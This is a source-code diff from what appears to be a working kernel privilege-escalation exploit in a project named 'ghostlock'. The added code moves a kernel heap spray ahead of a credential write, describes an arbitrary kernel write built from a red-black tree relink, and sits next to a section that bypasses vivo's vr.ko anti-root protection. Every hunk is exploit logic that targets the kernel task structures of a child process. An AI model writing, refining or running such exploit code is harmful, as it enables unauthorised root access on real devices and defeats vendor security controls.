@@ -143,6 +143,19 @@ namespace ghostlock::session::backend {
             }
 
             pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
+
+            /* Spray W3-0's leaf-direction page now, while the heap is still in
+         * the W2-safe window: every measured PREP-DEATH sits inside the first
+         * KernelSnitch futex scan after W2 fires (rounds-sprayprobe gate), so
+         * the W3-0 spray moves before the credential write and its activation
+         * later is fd-only work. Failure is not fatal -- W3-0 falls back to
+         * spraying one itself. */
+            support::run_state::enter("w2p");
+            if (!support::prepare_prebuilt_leaf_page(
+                    child_task + ghostlock::profile::task_comm_off())) {
+                pr_warning("W3-0 prebuilt page unavailable; W3-0 will spray its own\n");
+            }
+            support::run_state::complete("w2p");
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
@@ -499,11 +512,15 @@ namespace ghostlock::session::backend {
         /* Both transports write *(target) := value through the erase left-only
          * relink: waiter words are {pc = value, right = 0, left = target} and
          * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
-        attack::timer_mark("  heap spray start");
-        (session.heap.current.base) = support::prepare_good_kernel_page(request);
-        if (!(session.heap.current.base)) {
-            pr_warning("  heap spray failed\n");
-            return 0;
+        if (support::consume_prebuilt_leaf_page(request)) {
+            pr_info("  heap spray skipped (prebuilt W3-0 page activated)\n");
+        } else {
+            attack::timer_mark("  heap spray start");
+            (session.heap.current.base) = support::prepare_good_kernel_page(request);
+            if (!(session.heap.current.base)) {
+                pr_warning("  heap spray failed\n");
+                return 0;
+            }
         }
 
         attack::timer_mark("  heap spray done");
